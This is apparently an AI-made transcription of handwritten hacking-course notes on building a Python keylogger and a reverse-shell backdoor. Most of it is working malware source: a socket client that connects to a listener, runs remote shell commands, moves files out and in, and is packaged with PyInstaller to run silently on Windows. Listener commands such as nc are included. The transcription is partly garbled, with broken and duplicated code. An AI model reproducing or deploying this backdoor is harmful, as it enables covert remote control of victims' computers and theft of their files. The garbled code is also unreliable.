+"satyamgupta@gmail.com", "143568") 3. my_keyloggers.start() - Now if you run
+keylog.py file from terminal your - keyloggers will works - **Note:** To get
+email don't forget to switch on - less secure app inside gmail setting ### Page
+51 of 160: #14 Writing Malware Backdoors - Introduction of Features - **#14
+Writing malware backdoors** - **Reverse backdoor features:** - Access file
+system - Execute system commands - Download files - Upload files - Persistence -
+**#9 Client-server communication connection types:** - Interactive program gives
+access to system cut - executed on 1. Command execution 2. Access file system 3.
+Upload/download files 4. ... etc - **Backdoors:** - **Names:** - **System
+Command** - **Reset** ### Page 52 of 160: Bind vs Reverse Connections -
+**Backdoors > Bind vs Direct Connection:** - **Hacker** ← **System Command** →
+**Connection** - **In bind connection (connection hacker computers to victim
+computers coming from** - **Backdoor reverse connection:** - **Hacker** →
+**System Command** → **Victim** - **In reverse connection:** - Hackers ←
+Connection victim - Listening for incoming connections - on a specific port ###
+Page 53 of 160: Connecting Two Remote Computers - **#3 Connecting two remote
+computers using servers:** - Through socket library you can also create a - chat
+application - **Note:** (L) for listening we will create our own but later on
+will course we - will create with create our post listener - **Create a python
+file called Reverse_back.py** 1. Import socket 2. connection =
+socket.socket(socket.AF_INET, socket.SOCK_STREAM) 3.
+connection.connect(("10.0.2.15", 4444)) - **TP in Kali:** - IP of listener -
+port of listener - **In Kali machine IP of listener:** - nc -lvnp 4444 - **To
+post to listen in Kali** - **New if you run reverse_back.py you will - see
+message got a connection - etc and second C** ### Page 54 of 160: Sending &
+Receiving Data over TCP - **#5 Sending & Receiving data over TCP** 1. Import
+socket 2. connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 3.
+connection.connect(("10.0.2.15", 4444)) 4. connection.send("connection
+established".encode()) - **Up to here if you have run this python - for
+connection in kali if kali terminal open and listening - message connection
+established if formal** 5. received_data = connection.recv(1024) 6.
+print(received_data) *(buffer size of 1024)* 7. connection.close() *(# Good
+practice to close the connection)* - **# Note:** If you run all this command,
+hacker pause - computer 1st you will feel program is fake pause - it pause
+because it wait for the data give from kali terminal - **L. In kali terminal 1st
+you will see message connection** - established and kali terminal after this is
+a test - kali terminal type this got printed you will see this is a test message
+got ### Page 55 of 160: Backdoor Listener Code - **Sending data over socket** 1.
+Import socket 2. connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+3. connection.connect(("10.0.2.15", 4444)) 4. connection.send("connection
+established".encode()) - **If you see the command, write** - **Complete
+reverse_back.py file:** - import socket - connection =
+socket.socket(socket.AF_INET, socket.SOCK_STREAM) -
+connection.connect(("10.0.2.15", 4444)) - connection.send("connection
+established".encode()) - received_data = connection.recv(1024) -
+print(received_data.decode()) - connection.close() - **Now if you run all this
+command, hacker pause** - computer 1st you will feel program is fake pause - it
+pause because it wait for the data give from kali terminal ### Page 55 of 160:
+#5 Execute System Command Remotely - **#5 Execute system command remotely:** - #
+We can send one from kali terminal to windows that if kali - send command for
+windows terminal and execute that command key subprocess 1. Import socket 2.
+Import subprocess 3. def execute_system_command(command): - return
+subprocess.check_output(command, shell=True) - # This return command out put 4.
+connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 5.
+connection.connect(("10.0.2.15", 4444)) 6. connection.send("connection
+established".encode()) 7. while True: - # Here we use while loop so that
+infinitely it - will take command from kali and execute it in - windows
+infinitely 8. command = connection.recv(1024) 9. command_result =
+execute_system_command(command) - # Because of return command we have captured
+return - output in command_result variable 10. connection.send(command_result)
+11. connection.close() - **If we want to run infinitely we will have to use
+while loop** ### Page 56 of 160: Continuation - Infinite Loop for Command
+Execution - **while True:** - command = connection.recv(1024) - command_result =
+execute_system_command(command) - connection.send(command_result) - **# Because
+of return command we have captured return** - **output in command_result
+variable** - **connection.send(command_result)** - **connection.close()** - **If
+we want to run infinitely we will have to use while loop** - **Now if you run
+listener.py file from kali terminal** - it will work like listener - **Now if
+you run python reverse_backdoor.py from windows computer:** - (this python
+reverse_backdoor) - **Now you can send as many commands as you want** - **Normal
+message transfer is this** - but if we want to transfer file then** ### Page 57
+of 160: #15 Implementing Skeleton for Servers-Client Communication - **#15
+Implementing skeleton for servers-client communication** - **The only problem
+with our listener is** - connect to hackers machine listener guess because - we
+didn't gave any code to execute infinitely loop - **So that when command with
+get executed on victim** - computers command with get executed on victim
+computers** - **Code inside listener.py file:** 1. Import socket 2. listener =
+socket.socket(socket.AF_INET, socket.SOCK_STREAM) 3.
+listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 4.
+listener.bind(("10.0.2.15", 4444)) 5. listener.listen(0) 6. print("Waiting for
+incoming connections") 7. connection_address = listener.accept() 8. print(f"I
+got a connection from {connection_address}") 9. while True: - command =
+input(">>") - connection.send(command.encode()) - result = connection.recv(1024)
+- print(result.decode()) - **(Normal) hacker input command send to victim
+execute and return result** ### Page 58 of 160: Continuation - Code for
+Connection Handling in Listener - **connection_address = listener.accept()** -
+**print(f"I got a connection from {connection_address}")** - **while True: # #
+loop for infinite loop** - **command = input(">>") # to take input command** -
+**connection.send(command.encode()) # to send this command to backdoor** -
+**result = connection.recv(1024)** - **print(result.decode()) # normal hacker
+input command send to victim execute and return result** - **Now run this code
+from kali terminal it will work like listener** - **Now if you run python
+reverse_backdoor.py from windows computer:** - **(this python
+reverse_backdoor)** - **Now you can send as many commands as you want** ### Page
+59 of 160: #6 Refactoring - Creating a Listener Class 1. Import socket 2. class
+Listener: 3. def __init__(self, ip, port): - listener =
+socket.socket(socket.AF_INET, socket.SOCK_STREAM) -
+listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) -
+listener.bind((ip, port)) - listener.listen(0) - print("Waiting for incoming
+connections") - self.listener = listener 4. def accept(self): -
+connection_address = self.listener.accept() - print(f"I got a connection from
+{connection_address}") - return connection_address 5. def execute_remotely(self,
+command): - self.connection.send(command.encode()) - return
+self.connection.recv(1024) 6. def run(self): - connection_address =
+self.accept() - while True: - command = input(">> ") - result =
+self.execute_remotely(command) - print(result.decode()) - **# We used self
+before connection because connection** - **variable will be used in others
+because connection** - **# All these code are responsible for listen IP and
+port** - **so directly I put all these code inside** - **constructor so that
+whenever listener class will be called code inside constructor will
+automatically run** ### Page 60 of 160: #10 My Listener = Listener and Run -
+**my_listener = Listener("10.0.2.15", 4444)** - **my_listener.run()** - **All
+keylogger code and outside of** - **keylogger class. So that we can run** -
+**from kali terminal run it by python listener.py** - **In windows run python
+reverse_backdoor.py** - **Now if you run listener.py from kali terminal it will
+work** - **Now if you run python reverse_backdoor.py from windows computer:** -
+**(this python reverse_backdoor)** ### Page 61 of 160: #9 Refactoring - Creating
+a Backdoor Class - **Open reverse_backdoor.py file** 1. Import socket 2. Import
+subprocess 3. class Backdoor: 4. def __init__(self, ip, port): - self.connection
+= socket.socket(socket.AF_INET, socket.SOCK_STREAM) -
+self.connection.connect((ip, port)) - # If put all there code inside constructor
+do, that - whenever backdoor class will be called code inside - constructor will
+automatically run - # I put self before connection variable because connection -
+variable will be used in others method also inside - backdoor class 5. def
+execute_system_command(self, command): - return subprocess.check_output(command,
+shell=True) 6. def run(self): - while True: - command =
+self.connection.recv(1024) - command_result =
+self.execute_system_command(command) - self.connection.send(command_result) 7.
+my_backdoor = Backdoor("10.0.2.15", 4444) 8. my_backdoor.run() - **# This code
+is outside of backdoor class** ### Page 62 of 160: #10 Backdoor Serialization -
+Benefits - **#10 Serialization - Theory:** - **For socket function we used
+socket.SOCK_STREAM** - means it is a tcp connection. And tcp stream which -
+leased protocol of not a message based - **Serves (II)** ← **Message Box** →
+**Client (II)** - **Data and server protocol means if pipe client is pushing
+the** - **data but server doesn't know** - **where is the end of the data:** -
+**Serves (II)** ← **Sample long data** → **Client (II)** - **to send over TCP**
+- **stream client want to send** - **connection.recv(1024)** - means we said the
+server - to take only 1024 bit of data even - before client it sending of so we
+will - not get out the data of client - **On victim computers or have a txt file
+and try to read 30 lines of** - **text in it and from listener.py file try to
+read it** - **command more sample.txt you will see only few lines of text of you
+send** - **entry you will get error [broken pipe** - **exception]** - **Note:**
+The problem vs here data is big than buffer size of 1024 - **This problem will
+create bigger issue because we will download photo video etc.** ### Page 63 of
+160: Backdoor Socket - Problem and Solution - **Problem:** - TCP is stream based
+- Difficulty to identify the end of message - **Solution:** - Make sure the
+message is well defined - Implement a protocol that send and receive message -
+**Implementation:** - Confirm to send and receive message - **Send size of
+message or header:** - Append an end of message and to the end of each message -
+**Serialize the message** - **Backdoor Serialization - Benefits:** 1. Message is
+well defined & receives lacks any message is incomplete 2. (Can be used to)
+transfer object (data, etc.) 3. Converts well-defined stream of bytes back into
+an object 4. Converts well-defined object to a stream of bytes ### Page 64 of
+160: Continuation of Backdoor Serialization Benefits *(Note: This page appears
+to be a partial continuation or diagram from Page 63, focusing on visual
+representation of message flow with boxes and arrows. No new textual content;
+mainly diagrams showing client-server message box serialization with fixed data
+inside a box, end of message markers, and sample complete data to send over TCP
+stream.)* - Serves client has fixed the data inside a message box - And send it
+to server. The server will receive data until the whole box - After the server
+don't complete knows what possible the box - The sample complete data box to
+send over TCP stream - (Mathematical notations or placeholders: e.g., (data) :
+(json, xml, etc.); (big long data box) = (data)(json_data)(etc.)) ### Page 65 of
+160: Serialization Client Fixed Data in Message Box - **Serves** ← **Client** -
+It message box - Name box to template for data - All data - In serialization
+client has fixed the data inside a message box - And send it to serves the serve
+will receive data until the whole box - After the server don't knows what
+possible the box - The sample complete data box to send over TCP stream - The
+server will open the box - (Code-like placeholders:) - ... : (json, xml) (big
+long data box) = (data)(json_data)(etc.) - (data) not length = (data)(json_data)
+- {(json_data): (etc.)} (etc.) - (big_data): (unknown) (etc.) receive ### Page
+66 of 160: #11 Serialization - Implementing Reliable Methods to Send & Receive
+Data - **Implementations:** - JSON and Pickle are common - JSON (JavaScript
+Object Notation) - implemented in many programming languages - Represents object
+as text - widely used when transferring data between clients and servers -
+**Code inside listener.py:** 1. Import socket, json 2. Class Listener: 3. def
+__init__(self, ip, port): ... 4. def reliable_send(self, data): - json_data =
+json.dumps(data) - self.connection.send(json_data) *(# Most general data to JSON
+data - to send this data)* 5. def reliable_receive(self): - json_data =
+self.connection.recv(1024) - return json.loads(json_data) *(# To receive JSON
+data)* 6. def execute_remotely(self, command): - self.reliable_send(command) -
+return self.reliable_receive() ### Page 67 of 160: Continuation - Code for run()
+in Listener - def run(self): ... - my_listeners = Listener("10.0.2.15", 4444) -
+my_listeners.run() - **Now we will have back to use left opened folder class**
+*(Diagram showing backdoor and listener connection)* - Also so that backdoors
+will also in JSON folder class - **Code inside reverse_backdoor.py:** 1. Import
+socket, subprocess, json 2. Class Backdoor: 3. def __init__(self, ip, port): ...
+4. def reliable_send(self, data): ... 5. def reliable_receive(self): ... 6. def
+execute_system_command(self, command): ... 7. def run(self): - while True: -
+(command) = self.reliable_receive() - command_result =
+self.execute_system_command(command) - self.reliable_send(command_result) - ...
+8. my_backdoor = Backdoor("10.0.2.15", 4444) 9. my_backdoor.run() - **# Now
+everything will work properly and you can transfer any data - text, video, audio
+etc.** ### Page 68 of 160: #12 Serialization - Reliably Sending & Receiving Data
+- **Note:** The problem here is if you try to send big file u will get value
+errors: unterminated string - Undetermined string errors means we couldn't
+receive whole package are receive only the part - Of package but json open
+package only if it receive full package that's why it can't open the package or
+box. - So we will have to use infinite loop until we get value errors so that we
+can receive the whole data - **Code inside listener.py:** 1. Import socket, json
+2. Class Listener: ... 3. def reliable_send(self, data): ... 4. def
+reliable_receive(self): - while True: - json_data = json_data +
+self.connection.recv(1024) - try: return json.loads(json_data) - except
+ValueError: *(# means value error continue)* - continue 5. … ### Page 69 of 160:
+Continuation - Code for execute_remotely and run in Listener, Backdoor Setup -
+def execute_remotely(self, command): ... - def run(self): ... - my_listeners =
+Listener("10.0.2.15", 4444) - my_listeners.run() - **Code inside
+reverse_backdoor.py:** 1. Import sockets, subprocess, json 2. Class Backdoor:
+... 3. *(Some code with while True: ...)* 4. json_data = "" 5. while True: -
+try: ... - except: continue 6. def execute_system_command(self, command): ... 7.
+my_backdoors = Backdoor("10.0.2.15", 4444) 8. my_backdoor.run() - **# New
+everything will work properly and you can transfer any data - etc.** ### Page 70
+of 160: #13 Sending Commands as List of Implementing Exit Command - **Reverse
+Backdoor Features:** - Command execution - > dis - Access file system - > cd
+DirectoryName - Upload files: (file name, etc.) - > upload filename.txt -
+Download files: (parameter) - > download parameter = etc. - We will try to
+convert our commands as list - **Code inside listener.py:** - Import socket,
+json - class Listener: - def __init__(self, ip, port): ... - def
+reliable_send(self, data): ... - def reliable_receive(self): ... - def
+execute_remotely(self, command): - self.reliable_send(command) - return
+self.reliable_receive() ### Page 71 of 160: def run(self) Implementation and
+Note on Closing Listener - def run(self): - while True: - command = input(">> ")
+- [command = command.split(" ")] - print(command) - if I want to split command
+take first element - print(command[0]) *(# To exit program)* - return
+self.reliable_receive() - def run(self): - while True: - command = input(">> ")
+- command = command.split(" ") - result = self.execute_remotely(command) -
+print(result) - Giving command as list will output *(because falseproof check
+output) (can also)* - **my_listeners = Listener("10.0.2.15", 4444)** -
+**my_listeners.run()** - **Now if you run exit from kali terminal properly.** -
+**Note:** - problem with our backdoor and listener is - To close listeners we
+will have to use if else(condition) in listener and also it give - Errors in
+listener and some feedback it - Errors on backdoor.py file or something it -
+leave handler (open + l...) *(To handle listener and)* - So not backdoor also he
+- in backdoor if command[0]=="exit" - self.connection.close() - exit() ### Page
+72 of 160: Code Inside Listener.py - Full Class Definition - **Code inside
+listener.py** 1. import socket, json 2. class Listener: 3. def __init__(self,
+ip, port): ... 4. def reliable_send(self, data): ... 5. def
+reliable_receive(self): ... 6. def execute_remotely(self, command): ... 7. def
+run(self): - while True: - command = input(">> ") - command = command.split(" ")
+- result = self.execute_remotely(command) - print(result) 8. my_listener =
+Listener("10.0.2.15", 4444) 9. my_listener.run() ### Page 73 of 160: Code Inside
+Listener.py - Full Class with Upload/Download - **Code inside listener.py** 1.
+import socket, json 2. class Listener: 3. def __init__(self, ip, port): ... 4.
+def reliable_send(self, data): - json_data = json.dumps(data) -
+self.connection.send(json_data) 5. def reliable_receive(self): ... 6. def
+execute_remotely(self, command): ... 7. def write_file(self, path, content): -
+with open(path, "wb") as file: - file.write(base64.b64decode(content)) - return
+"[+] File downloaded successfully" 8. def read_file(self, path): - with
+open(path, "rb") as file: - return base64.b64encode(file.read()) 9. def
+run(self): - while True: - command = input(">> ") - command = command.split(" ")
+- result = self.execute_remotely(command) - print(result) - **my_listener =
+Listener("10.0.2.15", 4444)** - **my_listener.run()** ### Page 74 of 160: #16
+Interacting with the File System - Implementation - **#16 Interacting with the
+file system - Implementation** - **CD command changes current working
+directory** - **Reverse Backdoors:** - Access file system - **(i) cd shows
+current working directory** - **(ii) cd DirectoryName → change current working**
+- **directory to DirectoryName** - **Code inside reverse_backdoor.py:** 1.
+Import subprocess, json, socket, os *(# os module to change directory)* 2. class
+Backdoor: 3. def __init__(self, ip, port): ... 4. def reliable_send(self, data):
+... 5. def reliable_receive(self): ... 6. def execute_system_command(self,
+command): ... 7. def change_working_directory_to(self, path): - os.chdir(path) -
+return "[+] Changing working directory to " + path ### Page 75 of 160:
+Continuation - run() Method with CD Handling - **def run(self):** - while True:
+- command = self.reliable_receive() - if command[0] == "exit": -
+self.connection.close() - exit() - elif command[0] == "cd" and len(command) > 1:
+- result = self.change_working_directory_to(command[1]) - else: - command_result
+= self.execute_system_command(command) - self.reliable_send(command_result) -
+**# To take 1st element from list** - **# And statement are same** -
+**my_backdoor = Backdoor("10.0.2.15", 4444)** - **my_backdoor.run()** ### Page
+76 of 160: #15 Reading File - Reverse Backdoor File Download - **#15 Reading
+file:** - **Reverse backdoor file download** - **A file is a series of
+characters** - **Therefore to transfer a file we need to:** 1. Read the file as
+a sequence of characters 2. Send this sequence of characters 3. Create a new
+empty file at destination 4. Store the transferred sequence of characters - in
+the new file - **We will use inside this function inside backdoor:** - **def
+read_file(self, path):** - with open(path, "rb") as file: - return
+base64.b64encode(file.read()) - **# "rb" means read file in binary mode** - **To
+read text file you can give "r"** - **but to read binary file you will have to**
+- **give "rb"** - **# Code inside with open and inside code** - **will be
+executed only when file is open** - **Note:** In python with is used to manage,
+unmanaged stream of data ### Page 77 of 160: Code Inside Listener.py - Download
+Implementation - **Upload file to victim** 1. import subprocess, json, socket,
+base64 2. class Backdoor: 3. def __init__(self, ip, port): ... 4. def
+reliable_send(self, data): ... 5. def reliable_receive(self): ... 6. def
+execute_system_command(self, command): ... 7. def
+change_working_directory_to(self, path): ... 8. def read_file(self, path): -
+with open(path, "rb") as file: - return base64.b64encode(file.read()) 9. def
+run(self): - while True: - command = self.reliable_receive() - if command[0] ==
+"exit": - self.connection.close() - exit() - elif command[0] == "cd" and
+len(command) > 1: - result = self.change_working_directory_to(command[1]) - elif
+command[0] == "download": - result = self.read_file(command[1]) - else: -
+command_result = self.execute_system_command(command) -
+self.reliable_send(command_result) ### Page 78 of 160: #16 Downloading Files
+from Hacked Computer - **#16 Downloading files from hacked computer** -
+**Note:** Problem with previous code is that - allows to download text file only
+- If you try to download like binary file image: - It will give binary errors
+because - binary file has binary content which - and from can't cause us - **So
+we will have to convert binary data into** - **base64 encoding before sending it
+at the time of receiving** - **Base64 change binary code of characters into** -
+**some known characters which python can understand** - **To encode in base64
+method we** - **base64.b64encode(file.read())** - **To decode in base64 method
+we** - **base64.b64decode(content)** ### Page 79 of 160: Code Inside
+Reverse_Backdoor.py - Full Class with Read File - **Code inside
+reverse_backdoor.py** 1. Import subprocess, json, socket, base64 2. class
+Backdoor: 3. def __init__(self, ip, port): ... 4. def reliable_send(self, data):
+... 5. def reliable_receive(self): ... 6. def execute_system_command(self,
+command): ... 7. def change_working_directory_to(self, path): ... 8. def
+read_file(self, path): - with open(path, "rb") as file: - return
+base64.b64encode(file.read()) 9. def run(self): - while True: - command =
+self.reliable_receive() - if command[0] == "exit": ... - elif command[0] == "cd"
+and len(command) > 1: ... - elif command[0] == "download": - result =
+self.read_file(command[1]) - else: - command_result =
+self.execute_system_command(command) - self.reliable_send(command_result) 10.
+my_backdoor = Backdoor("10.0.2.15", 4444) 11. my_backdoor.run() ### Page 80 of
+160: Code Inside Listener.py - Write File Implementation - **Code inside
+listener.py file** 1. Import socket, json, base64 2. class Listener: 3. def
+__init__(self, ip, port): ... 4. def reliable_send(self, data): ... 5. def
+reliable_receive(self): ... 6. def execute_remotely(self, command): ... 7. def
+write_file(self, path, content): - with open(path, "wb") as file: -
+file.write(base64.b64decode(content)) - return "[+] File uploaded successfully"
+8. def run(self): - while True: - command = input(">> ") - command =
+command.split(" ") - result = self.execute_remotely(command) - print(result) -
+**# Everything is same as previous code** - **my_listener =
+Listener("10.0.2.15", 4444)** - **my_listener.run()** ### Page 81 of 160: #17
+Implementing Upload Functionality in Listener - **#17 Implementing upload
+functionality in listener** - **File upload** - is of file is a series of
+characters - ii) uploading a file it the opposite of downloading - **Therefore
+to transfer a file we need to** 1. Read the file as a sequence of characters 2.
+Send this sequence of characters 3. Create a new empty file at destination 4.
+Store the transferred sequence of characters - in the new file - **Note:**
+Upload is opposite of download - **So in listener to upload file to hacker
+computer in** - **listener send open a file send its content to backdoor** -
+**In backdoor we will have to use file content** - **from hacker computer open a
+file write that content** - **inside the file** - **Note:** In listener we will
+try to do this type of attempt** ### Page 82 of 160: Continuation - Upload
+Command Handling - **"upload" "sample.txt" content of sample.txt** - **Now in
+listener.py file:** - if command[0] == "upload": - file_path = command[1] -
+file_content = self.read_file(file_path) - result = self.write_file(command[2],
+file_content) - **def read_file(self, path):** - with open(path, "rb") as file:
+- return base64.b64encode(file.read()) - **def write_file(self, path,
+content):** - with open(path, "wb") as file: -
+file.write(base64.b64decode(content)) - return "Uploaded successfully" #### Step
+1: Page 83 - Code Inside Listener.py (Imports and Init) **Page Header**: Page 83
+of 160 (date grid: Mon Tue Wed Thu Fri Sat Sun). **Main Content**: - > Code
+inside listener.py - 1) import subprocess, json, socket, base64 - 2) Class
+Listener: (self, ip, port): ... - def __init__(self, self, ip, port): ... - :
+(Code is same) - def write_file(self, path, content): ... - def read_file(self,
+path): ... - with open(path, "rb") as file: content - return
+base64.b64encode(file.read()) **Annotations/Highlights**: - Yellow highlight on
+"Code is same". - Green underline on base64 encoding return. #### Step 2: Page
+84 - Code Inside Listener.py (Run Loop, Upload Handling) **Page Header**: Page
+84 (bottom right). **Main Content**: - def run(self): - while True: - command =
+self.receive() - # To attend the content of the file which will be sent to
+backdoor content - if command[0] == "upload": - file_content =
+self.read_file(command[1]) - command = command.append(file_content) - result =
+self.execute_system_command(command) - if command[0] == "download": - result =
+self.write_file(command[1], result) - print(result) - my_listener =
+Listener("10.0.2.16", 4444) - my_listener.run() **Annotations/Highlights**: -
+Yellow highlight on "To attend the content...". - Green highlight on
+upload/download if-blocks. #### Step 3: Page 85 - Implementing Upload
+Functionality in Backdoor.py **Page Header**: Page 85 of 160 (date grid). **Main
+Content**: - *13) Implementing upload functionality in Backdoor* - > Code inside
+backdoor.py: - import subprocess, json, socket, os - class Backdoors: self, ip,
+port: ... - def __init__(self, self, ip, port): ... - codes: (codes are same) -
+def read_file(self, path): ... - def write_file(self, path, content): - with
+open(path, "wb") as file: content - file.write(base64.b64decode(content)) -
+return - def run(self): while True: - command = self.reliable_send -
+self.reliable_send(command) - my_backdoor = Backdoor("10.0.2.16", 4444) -
+my_backdoor.run() **Annotations/Highlights**: - Yellow highlight on write_file
+with base64 decode. - Green underline on run loop. #### Step 4: Page 86 -
+Handling Unknown Exceptions in Backdoors **Page Header**: Page 86 of 160 (date
+grid). **Main Content**: - *15) Handling Unknown Exceptions:* - > Backdoors
+Handling Errors: - i) If the client of sends eraske, the conne will be lost -
+ii) Backdoor crashet if: - L) incorrect command in sent - L) of correct command
+is mis-used - Eg if command will dir but by mutale give dir. - It will give
+error and the conne will be lost - L) (sftp) gload pod or reply file which
+doesn't exist - 1) 1st method to try and except specific error - ie try: return
+subprocess.check_output(command, shell=True) - except AttributeError: # if it
+specific err. - "koi bhi error during command exec" - 2) 2nd method to use try
+and except any type of error - try: # + code to try - (line buiho line, addis) -
+except Exception: - In this way all type of error is excepted.
+**Annotations/Highlights**: - Yellow highlight on "if the client... conne will
+be lost". - Green highlight on try-except blocks. #### Step 5: Page 87 - Code
+Inside Listener.py (Download and Error Handling) **Page Header**: Page 87
+(bottom right). **Main Content**: - > Code inside Listener.py - 1) import
+socket, json, base64 - 2) Class Listeners: (self, ip, port): ... - def
+__init__(self, self, ip, port): ... - : (Code is dame) - def run(self): - while
+True: content = input(">", ) - command = content.split(" ") - # try block - { if
+command[0] == "upload": file_content = self.read_file(command[1]) -
+command.append(file_content) - result = self.execute_remotely(command) - # if
+command[0] == "download" and "err" - not if result: - result =
+self.write_file(command[1], result) - print(result) - except Exception: result =
+"[-] Error during command exec" - print(result) - > my_listner =
+Listeners("10.0.2.16", 4444) - > my_listner.run() **Annotations/Highlights**: -
+Yellow highlight on try-block for upload. - Green highlight on except Exception
+line. #### Step 6: Page 88 - Code Inside Backdoor.py (Exit Command Handling)
+**Page Header**: Page 88 (bottom right). **Main Content**: - > Code inside
+Backdoor.py - 1) import subprocess, json, socket, os - 2) class Backdoor: - def
+__init__(self, self, ip, port): ... - def reliable_send(self, data): ... - def
+reliable_recv(self): ... - def execute_system_command(self, command): - return
+subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT,
+stdin=subprocess.PIPE) - def change_working_directory_to(self, path): ... - def
+read_file(self, path): ... - def write_file(self, path, content): ... - def
+run(self): - while True: - command = self.reliable_recv() - try: if command[0]
+== "exit": - self.connection.close() - sys.exit() - elif command[0] ==
+"download" and len(command) > 1: - result = self.write_file(command[1], result)
+- self.reliable_send(command, result) - my_backdoor = Backdoor("10.0.2.16",
+4444) - my_backdoor.run() **Annotations/Highlights**: - Yellow highlight on "if
+command[0] == 'exit'". - Green highlight on execute_system_command return. ####
+Step 7: Page 89 - Getting the Backdoor to Hack Windows, Linux, OSX **Page
+Header**: Page 89 (bottom right). **Main Content**: - *15) Getting the Backdoor
+to Hack Windows Linux, OSX* - 5) Cross-platform Hacking. - i) All programs we
+write are pure python program - ii) they do self on affecting system - > Hence:
+They work on any operating system with a python interpreter. - iii) If packaged
+they will work on any operating by - if even-of python us not installed - *Note:
+There Backdoor and these python file we write on any operating system:* - L)
+Linux and OSX comes with python preinstalled in there for operating system -
+(Twist: However for windows you have to install python)
+**Annotations/Highlights**: - Yellow highlight on "they do self on affecting
+system". - Green highlight on "cross-platform... with a python interpreter".
+#### Step 8: Page 90 - Introduction to Tools - Packaging (PyInstaller) **Page
+Header**: Page 90 (bottom right). **Main Content**: - *#15) Introduction of
+Tools -* - Packaging- - *23) Converting python programs to windows executable* -
+Packaging - L) Convert python program into an executable that: - i) Package all
+program files into a single executable. - ii) Works without a python
+interpreter. - iii) Get executed when double-clicked - L) for best result
+package the program from the same operating system as the target - Eg> If the
+target is windows then package the program from a windows computer with a python
+interpreter. - 4) Pyinstaller is a program through which we can convert py file
+to exe for target system - i) Get install pyinstaller -> pip is a module to
+install python file - ii) pyinstaller.exe reverse backdoor.py -onefile to
+convert all file to one exe **Annotations/Highlights**: - Yellow highlight on
+"convert python programs to windows executable". - Green highlight on
+PyInstaller command. #### Step 9: Page 91 - Running Executables Silently and
+sys.exit() Fix **Page Header**: Page 91 of 160 (date grid). **Main Content**: -
+*Note-1: Now which that one you can run it from any computer* - *Note-2: The
+only one problem with our exe file that if you run it on target computers it
+will open a file that open console window and that console will stay - if you
+close target computer until hacker work is done.* - L) So when hacker type exit
+and backdoor kite the console window now show error. - this error can be easily
+solved in backdoor.py - 12) import sys and to place of exit(code replace it with
+sys.exit() - L) sys.exit() is a python code to safely exit or close python : -
+program - *To convert spy file to exe without Console* - L) pyinstaller
+--onefile -w filemane.py **Annotations/Highlights**: - Yellow highlight on "the
+only one problem... console will stay". - Green highlight on "sys.exit() is a
+python code...".’ #### Step 10: Page 92 - Running Executables Silently
+(Subprocess Check Output) **Page Header**: Page 92 of 160 (date grid). **Main
+Content**: - *23) Running Executables Silently* - L) Note- To Get rid of Command
+Prompt window from hackers computer when your python exe is running - In
+pyinstaller you will have to give one argument - L) Note: above pyinstaller
+command except all one well run silently except standard which deal with
+standard Input, Output - those exe which run silently except standard - we
+standard output, And lay python errors. Because modal - when you have to
+standard errors. standard input, standard output to do - L): To
+subprocess.check_output() and standard output in given to a variable. - Print
+for standard errors and standard output we will have to redirect there to
+self.pipe DEVNULL - # Devnull is a location on the windows log - if anything
+redirected it just get vanished. **Annotations/Highlights**: - Yellow highlight
+on "To Get rid of Command Prompt...". - Green highlight on
+subprocess.check_output note. #### Step 11: Page 93 - Reverse Backdoor.py Code
+(Execute System Command) **Page Header**: Page 93 (bottom right). **Main
+Content**: - > Code inside [Reverse Backdoor.py] - 1) import socket, subprocess,
+json, os, base64 - 2) class Backdoor: - def __init__(self, self, ip, port): ...
+- def reliable_send(self, data): ... - def reliable_recv(self): ... - 6) def
+execute_system_command(self, command): - return subprocess.check_output(command,
+shell=True, stderr=subprocess.STDOUT, stdin=subprocess.PIPE) - # To redirect
+errors - # To remove stdin - stdin = subprocess.DEVNULL - 7) def
+change_working_directory_to(self, path): ... - 8) def read_file(self, path): ...
+- 9) def write_file(self, path, content): ... - 10) def run(self): - while True:
+- command = self.reliable_recv() - try: if command[0] == "exit": -
+self.connection.close() - sys.exit() - elif command[0] == "cd" as present code -
+To convert to exe without any console - > To convert reverse backdoor.py without
+error - L) Now this exe will run without present console - > Now this exe will
+run without console **Annotations/Highlights**: - Yellow highlight on "return
+subprocess.check_output...". - Green highlight on "To convert to exe without any
+console". This extraction covers Pages 83-93, building on backdoor persistence,
+error resilience, and deployment. If you need code testing (e.g., via
+code_execution tool) or more pages, let me know! ### Extracted Text from Python
+Ethical Hacking Notes (Continuation) I've analyzed the new uploaded images from
+your handwritten notebook. This set covers Pages 93-102 (with some
+overlaps/jumbles from prior extractions), focusing on reverse backdoor code
+refinements, PyInstaller packaging on Linux via Wine, persistence mechanisms
+(registry), and solving execution/connection issues. Transcriptions preserve
+structure, code snippets, and highlights/annotations (e.g., yellow for key
+notes, green for code). Organized **step by step by page number** (ascending),
+consolidating duplicates. #### Step 1: Page 93 - Reverse Backdoor.py Code
+(Execute Command and Run Loop) **Page Header**: Page 93 (bottom right, date
+grid: Mon Tue Wed Thu Fri Sat Sun). **Main Content**: - > Code inside [Reverse
+Backdoor.py] - 1) Import socket, subprocess, json, os, base64 - 2) class
+Backdoors: ... - def __init__(self, self, ip, port): ... - 5) def
+reliable_send(self, data): ... - 6) def reliable_recv(self): ... - 6) def
+execute_system_command(self, command): - return subprocess.check_output(command,
+shell=True, stderr=subprocess.STDOUT, stdin=subprocess.PIPE) - # To redirect
+errors [stderr = subprocess.DEVNULL] - # To remove stdin stdin =
+subprocess.DEVNULL - 7) def change_working_directory_to(self, path): ... - 8)
+def read_file(self, path): ... - 9) def write_file(self, path, content): ... -
+10) def run(self): - while True: - command = self.reliable_recv() - try: if
+command[0] == "exit": - self.connection.close() - sys.exit() - elif command[0]
+== "download" and len(command) > 1: - result = self.write_file(command[1],
+result) - self.reliable_send(command, result) - elif command[0] == "upload": -
+file_path = command[1] - file_content = self.read_file(file_path) -
+command.append(file_content) - result = self.execute_system_command(command) -
+self.reliable_send(result) - else: - # default case - result =
+self.execute_system_command(command) - self.reliable_send(result) - except
+Exception: - result = "[-] Error during command exec" -
+self.reliable_send(result) - > To convert it to exe without any console - > To
+convert reverse backdoor.py without error - L) Now this exe will run without
+present console - > Now this exe will run without console
+**Annotations/Highlights**: - Yellow highlight on "return
+subprocess.check_output...". - Green highlight on try-except block and "To
+convert to exe without any console". #### Step 2: Page 94 - Installing Windows
